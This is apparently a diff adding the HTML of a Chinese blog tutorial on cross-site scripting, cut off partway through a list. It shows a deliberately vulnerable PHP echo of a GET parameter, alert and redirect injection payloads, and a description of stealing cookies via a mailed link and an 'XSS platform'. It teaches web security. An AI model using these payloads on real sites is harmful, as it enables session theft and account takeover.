@@ -1,0 +1,863 @@
+<script type="text/javascript" src="../../source/js/love.js"></script><!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>跨站脚本攻击XSS | wolke</title><meta name="keywords" content="Web安全,XSS"><meta name="author" content="w01ke"><meta name="copyright" content="w01ke"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="一、XSS跨站漏洞（1）XSS简介&amp;emsp;&amp;emsp;网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区">
+<meta property="og:type" content="article">
+<meta property="og:title" content="跨站脚本攻击XSS">
+<meta property="og:url" content="https://wolke.cn/post/e0b257ee.html">
+<meta property="og:site_name" content="wolke">
+<meta property="og:description" content="一、XSS跨站漏洞（1）XSS简介&amp;emsp;&amp;emsp;网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180929165919I3N.png">
+<meta property="article:published_time" content="2022-01-30T14:45:22.000Z">
+<meta property="article:modified_time" content="2022-01-30T15:20:28.181Z">
+<meta property="article:author" content="w01ke">
+<meta property="article:tag" content="Web安全">
+<meta property="article:tag" content="XSS">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/20180929165919I3N.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://wolke.cn/post/e0b257ee"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//www.google-analytics.com" crossorigin=""/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?https://hm.baidu.com/hm.js?9b5e9e86a0a422ec787d72998e8fdbff";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script async="async" src="https://www.googletagmanager.com/gtag/js?id=G-Q0YHC68NHX"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-Q0YHC68NHX');
+</script><link rel="stylesheet" href="/wolke" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: w01ke","link":"链接: ","source":"来源: wolke","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '跨站脚本攻击XSS',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2022-01-30 23:20:28'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/static-butterfly/dist/css/index.min.css"><script src="/live2d-widget/autoload.js"></script><script src="/live2d-widget/autoload.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
+  'title',
+  '#config-diff',
+  '#body-wrap',
+  '#rightside-config-hide',
+  '#rightside-config-show',
+  '.js-pjax'
+]
+
+if (false) {
+  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
+}
+
+var pjax = new Pjax({
+  elements: 'a:not([target="_blank"])',
+  selectors: pjaxSelectors,
+  cacheBust: false,
+  analytics: true,
+  scrollRestoration: false
+})
+
+document.addEventListener('pjax:send', function () {
+
+  // removeEventListener scroll 
+  window.removeEventListener('scroll', window.tocScrollFn)
+  window.removeEventListener('scroll', scrollCollect)
+
+  typeof preloader === 'object' && preloader.initLoading()
+  
+  if (window.aplayers) {
+    for (let i = 0; i < window.aplayers.length; i++) {
+      if (!window.aplayers[i].options.fixed) {
+        window.aplayers[i].destroy()
+      }
+    }
+  }
+
+  typeof typed === 'object' && typed.destroy()
+
+  //reset readmode
+  const $bodyClassList = document.body.classList
+  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')
+
+})
+
+document.addEventListener('pjax:complete', function () {
+  window.refreshFn()
+
+  document.querySelectorAll('script[data-pjax]').forEach(item => {
+    const newScript = document.createElement('script')
+    const content = item.text || item.textContent || item.innerHTML || ""
+    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+    newScript.appendChild(document.createTextNode(content))
+    item.parentNode.replaceChild(newScript, item)
+  })
+
+  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()
+
+  typeof chatBtnFn === 'function' && chatBtnFn()
+  typeof panguInit === 'function' && panguInit()
+
+  // google analytics
+  typeof gtag === 'function' && gtag('config', 'G-Q0YHC68NHX', {'page_path': window.location.pathname});
+
+  // baidu analytics
+  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);
+
+  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+
+  // prismjs
+  typeof Prism === 'object' && Prism.highlightAll()
+
+  typeof preloader === 'object' && preloader.endLoading()
+})
+
+document.addEventListener('pjax:error', (e) => {
+  if (e.request.status === 404) {
+    pjax.loadUrl('/404.html')
+  }
+})</script><meta name="generator" content="Hexo 5.4.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/touxiang.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">39</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">27</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">13</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/black.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">wolke</a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 菜单</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li><li><a class="site-page child" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 电影</span></a></li></ul></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);"><i class="fa-fw fa fa-diamond"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/artitalk/"><i class="fa-fw fa fa-comments-o"></i><span> 说说</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa fa-paper-plane"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">跨站脚本攻击XSS</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-01-30T14:45:22.000Z" title="发表于 2022-01-30 22:45:22">2022-01-30</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-01-30T15:20:28.181Z" title="更新于 2022-01-30 23:20:28">2022-01-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">5.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>20分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="跨站脚本攻击XSS"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1623812807110-92a87dfe-1e4e-4edf-9eec-37b470ff1e34.png" alt="img"></p>
+<h1 id="一、XSS跨站漏洞"><a href="#一、XSS跨站漏洞" class="headerlink" title="一、XSS跨站漏洞"></a>一、XSS跨站漏洞</h1><h3 id="（1）XSS简介"><a href="#（1）XSS简介" class="headerlink" title="（1）XSS简介"></a>（1）XSS简介</h3><p>&emsp;&emsp;网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是css，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称XSS）的威胁，而静态站点则完全不受其影响。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<p>&emsp;&emsp;跨站脚本攻击是一种针对网站应用程序的安全漏洞攻击技术，<strong>是代码注入的一种</strong>。它允许恶意用户将代码注入网页，其他用户在浏览网页时会受到影响，恶意用户利用xss 代码攻击成功后，可能得到很高的权限、私密网页内容、会话和cookie等各种内容</p>
+<p>&emsp;&emsp;攻击者利用XSS漏洞旁路掉访问控制——例如同源策略(same origin policy)。这种类型的漏洞由于被黑客用来编写危害性更大的网络钓鱼(Phishing)攻击而变得广为人知。对于跨站脚本攻击，黑客界共识是：跨站脚本攻击是新型的“缓冲区溢出攻击”，而JavaScript是新型的“ShellCode”。</p>
+<p>&emsp;&emsp;xss漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以xss漏洞关键就是<strong>寻找参数未过滤的输出函数</strong>。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$xss</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$xss</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642341981620-921b4149-c445-4553-be94-700b74a88fe7.png" alt="img"></p>
+<h3 id="（2）产生层面"><a href="#（2）产生层面" class="headerlink" title="（2）产生层面"></a>（2）产生层面</h3><p>&emsp;&emsp;产生层面一般都是在前端，JavaScript代码能干什么，执行之后就会达到相应的效果</p>
+<h3 id="（3）函数类"><a href="#（3）函数类" class="headerlink" title="（3）函数类"></a>（3）函数类</h3><p>&emsp;&emsp;比如说php中的脚本的输出函数</p>
+<p>&emsp;&emsp;常见的输出函数有：<code>print</code>、<code>print_r</code>、<code>echo</code>、<code>printf</code>、<code>sprintf</code>、<code>die</code>、<code>var_dump</code>、<code>var_export</code></p>
+<h3 id="（4）危害影响"><a href="#（4）危害影响" class="headerlink" title="（4）危害影响"></a>（4）危害影响</h3><ul>
+<li><p>盗取各类用户帐号，如机器登录帐号、用户网银帐号、各类管理员帐号</p>
+</li>
+<li><p>控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力</p>
+</li>
+<li><p>盗窃企业重要的具有商业价值的资料</p>
+</li>
+<li><p>非法转账</p>
+</li>
+<li><p>强制发送电子邮件</p>
+</li>
+<li><p>网站挂马</p>
+</li>
+<li><p>控制受害者机器向其它网站发起攻击</p>
+</li>
+</ul>
+<p>&emsp;&emsp;其实归根结底，XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码。可问题在于尽管一个信息框突然弹出来并不怎么友好，但也不至于会造成什么真实伤害啊。的确如此，但要说明的是，这里拿信息框说事仅仅是为了举个栗子，真正的黑客攻击在XSS中除非恶作剧，不然是不会在恶意植入代码中写上<code>alert(&quot;say something&quot;)</code>的。在真正的应用中，XSS攻击可以干的事情还有很多，这里举两个例子。</p>
+<ol>
+<li><p><strong>窃取网页浏览中的cookie值</strong>。在网页浏览中我们常常涉及到用户登录，登录完毕之后服务端会返回一个cookie值。这个cookie值相当于一个令牌，拿着这张令牌就等同于证明了你是某个用户。如果你的cookie值被窃取，那么攻击者很可能能够直接利用你的这张令牌不用密码就登录你的账户。如果想要通过script脚本获得当前页面的cookie值，通常会用到cookie。试想下如果像空间说说中能够写入xss攻击语句，那岂不是看了你说说的人的号你都可以登录（不过貌似QQ的cookie有其他验证措施保证同一cookie不能被滥用）</p>
+</li>
+<li><p><strong>劫持流量实现恶意跳转</strong>。这个很简单，就是在网页中想办法插入一句像这样的语句： <code>&lt;script&gt;window.location.href=&quot;http://www.baidu.com&quot;;&lt;/script&gt;</code>那么所访问的网站就会被跳转到百度的首页。早在2011年新浪就曾爆出过严重的xss漏洞，导致大量用户自动关注某个微博号并自动转发某条微博。具体各位可以自行百度。</p>
+</li>
+</ol>
+<h3 id="（5）浏览器内核版本"><a href="#（5）浏览器内核版本" class="headerlink" title="（5）浏览器内核版本"></a>（5）浏览器内核版本</h3><p>&emsp;&emsp;利用XSS需要浏览器版本和内核没有过滤XSS攻击（比如用谷歌Edge火狐等打开可以成功，但是IE却会拦截）</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642342841941-5a0cad66-73d2-4e85-b2bd-38cb37cbdebd.png" alt="img"></p>
+<h3 id="（6）常出现场景"><a href="#（6）常出现场景" class="headerlink" title="（6）常出现场景"></a>（6）常出现场景</h3><p>&emsp;&emsp;文章发表、评论、留言、注册资料的地方、修改资料的地方等</p>
+<h1 id="二、XSS攻击的分类"><a href="#二、XSS攻击的分类" class="headerlink" title="二、XSS攻击的分类"></a>二、XSS攻击的分类</h1><p>&emsp;&emsp;XSS攻击分成两类，一类是来自内部的攻击，另一类则是来自外部的攻击</p>
+<h3 id="（1）来自内部的攻击"><a href="#（1）来自内部的攻击" class="headerlink" title="（1）来自内部的攻击"></a>（1）来自内部的攻击</h3><p>&emsp;&emsp;主要指的是利用程序自身的漏洞，构造跨站语句，如:dvbbs的showerror.asp存在的跨站漏洞。</p>
+<h3 id="（2）来自外部的攻击"><a href="#（2）来自外部的攻击" class="headerlink" title="（2）来自外部的攻击"></a>（2）来自外部的攻击</h3><p>&emsp;&emsp;主要指的自己构造XSS跨站漏洞网页或者寻找非目标机以外的有跨站漏洞的网页。如当我们要渗透一个站点，我们自己构造一个有跨站漏洞的网页，然后构造跨站语句，通过结合其它技术，如社会工程学等，欺骗目标服务器的管理员打开。</p>
+<h1 id="三、XSS的分类"><a href="#三、XSS的分类" class="headerlink" title="三、XSS的分类"></a>三、XSS的分类</h1><h2 id="1、反射型-非持久化"><a href="#1、反射型-非持久化" class="headerlink" title="1、反射型(非持久化)"></a>1、反射型(非持久化)</h2><h3 id="（1）原理"><a href="#（1）原理" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>&emsp;&emsp;反射型xss又称非持久型xss，是目前最普遍的类型，这种攻击方式往往具有一次性。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。</p>
+<h3 id="（2）攻击方式"><a href="#（2）攻击方式" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>&emsp;&emsp;攻击者通过电子邮件等方式将包含xss代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有xss代码的数据发送给目标用户的浏览器，浏览器解析这段带有xss代码的恶意脚本后就会触发xss漏洞</p>
+<h3 id="（3）判断是否存在反射型xss漏洞并利用"><a href="#（3）判断是否存在反射型xss漏洞并利用" class="headerlink" title="（3）判断是否存在反射型xss漏洞并利用"></a>（3）判断是否存在反射型xss漏洞并利用</h3><h4 id="①-判断有没有过滤一些特殊的字符"><a href="#①-判断有没有过滤一些特殊的字符" class="headerlink" title="① 判断有没有过滤一些特殊的字符"></a>① 判断有没有过滤一些特殊的字符</h4><p>&emsp;&emsp;比如对比输出的字符和输出的字符，可以看到有些字符被过滤了    </p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617367672003-13b2dba8-1f1c-4dbb-969b-77beeea4fa05.png" alt="img"></p>
+<h4 id="②-注入代码"><a href="#②-注入代码" class="headerlink" title="② 注入代码"></a>② 注入代码</h4><p>&emsp;&emsp;下面是大概的原理</p>
+<p>&emsp;&emsp;假如我输入的是1，提交后，点击查看网页源代码</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368119960-7de6f842-1d70-4a6e-9786-0ffb47fb6fae.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368167938-09da8f29-4386-4d14-9d65-8669c256ec8b.png" alt="img"></p>
+<h4 id="③-插入代码"><a href="#③-插入代码" class="headerlink" title="③ 插入代码"></a>③ 插入代码</h4><p>&emsp;&emsp;<code>&quot;&gt;&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code> #如果读取图片失败，则用alert显示相关信息<img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617367857065-1ee4c750-de1d-4ad1-a639-e502786baf27.png" alt="img"></p>
+<p>&emsp;&emsp;显示了信息，则说明存在xss注入<img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617367866441-a057b6a3-93ac-4a12-b6fa-322c647b0528.png" alt="img"></p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368347307-3a839a33-4f11-4f8f-92c2-a788393571ef.png" alt="img"></p>
+<p>&emsp;&emsp;可以对比看到，通过前面的闭合以及后面的代码插入，读取不到图片，因此触发了alert弹窗，显示了括号内的内容即/xss/</p>
+<h4 id="④-利用xss漏洞"><a href="#④-利用xss漏洞" class="headerlink" title="④ 利用xss漏洞"></a>④ 利用xss漏洞</h4><p>&emsp;&emsp;将刚刚成功注入代码并能触发xss的网址通过电子邮件等方式发送给对方的手中，如果结合xss平台，对方点击了链接，就能得到对方的cookie等信息</p>
+<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1617368869268-95db2fed-00e3-49d6-a9ee-f104017116fa.png" alt="img"></p>
+<h2 id="2、存储型-持久化"><a href="#2、存储型-持久化" class="headerlink" title="2、存储型(持久化)"></a>2、存储型(持久化)</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1642344755944-309efc16-b5fc-4b0e-ae0e-2b1bdcd6ca64.png" alt="img"></p>
+<h3 id="（1）原理-1"><a href="#（1）原理-1" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>&emsp;&emsp;存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。最典型的例子就是留言板XSS，用户提交一条包含XSS代码的留言存储到数据库，目标用户查看留言板时，那些留言就会从数据库中加载出来并显示，于是触发了XSS攻击</p>
+<h3 id="（2）攻击方式-1"><a href="#（2）攻击方式-1" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>&emsp;&emsp;这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行</p>
+<h3 id="（3）payload"><a href="#（3）payload" class="headerlink" title="（3）payload"></a>（3）payload</h3><p><code>&lt;img src=&quot;1&quot; onerror=&quot;alert(/xss/)&quot;/&gt;</code></p>
+<p>注入后重新刷新发现直接回显注入的东西，说明是存储型xss</p>
+<h2 id="3、DOM型"><a href="#3、DOM型" class="headerlink" title="3、DOM型"></a>3、DOM型</h2><p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1629707398023-84cc1277-38d6-495a-96e6-e6a521e12fc3.png" alt="img"></p>
+<h3 id="（1）原理-2"><a href="#（1）原理-2" class="headerlink" title="（1）原理"></a>（1）原理</h3><p>&emsp;&emsp;文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分  </p>
+<p>&emsp;&emsp;DOM型xss其实是一种特殊类型的反射型xss，也被称作<strong>本地跨站</strong>，它是基于DOM文档对象模型的一种漏洞。<strong>DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情</strong></p>
+<p>&emsp;&emsp;DOM中有很多对象，其中一些对象可以被用户所操纵，如url，location等。客户端的脚本程序可以通过DOM来动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而是从客户端取得DOM中的数据后并在本地执行，因此仅从服务器端是没有办法防御DOM型XSS漏洞的，如若DOM中的数据没有经过严格的验证，便会产生基于DOM的XSS漏洞。</p>
+<p>&emsp;&emsp;基于DOM的XSS是反射的特例，其中JavaScript隐藏在URL中，并在其呈现时由页面中的JavaScript取出，而不是在提供服务时嵌入到页面中。这可以使其比其他攻击更隐蔽，并且监控页面正文的WAF或其他防护检测不出恶意内容。</p>
+<h3 id="（2）攻击方式-2"><a href="#（2）攻击方式-2" class="headerlink" title="（2）攻击方式"></a>（2）攻击方式</h3><p>&emsp;&emsp;用户请求一个经过专门设计的URL，它由攻击者提交，而且其中包含xss代码。服务器的响应不会以任何的形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理xss代码，导致存在xss漏洞</p>
+<h3 id="（3）payload-1"><a href="#（3）payload-1" class="headerlink" title="（3）payload"></a>（3）payload</h3><ul>
+<li><code>&lt;img src=1 onerror=&quot;alert(/xss/)&quot;/&gt;</code></li>
+</ul>
+<h1 id="四、XSS攻击的途径"><a href="#四、XSS攻击的途径" class="headerlink" title="四、XSS攻击的途径"></a>四、XSS攻击的途径</h1><p>XSS攻击方法只是利用HTML的属性做各种尝试，找出注入的方法。现在对三种XSS攻击的主要方式进行分析。  </p>
+<ol>
+<li><p>第一种：对普通的用户输入，页面原样输出，攻击者通过对JSCODE的伪装，经过某些特定的操作就会跳出一个木马界面，从而取得登录用户的Cookie.  </p>
+</li>
+<li><p>第二种：在代码区内存在有用户输入的内容  </p>
+</li>
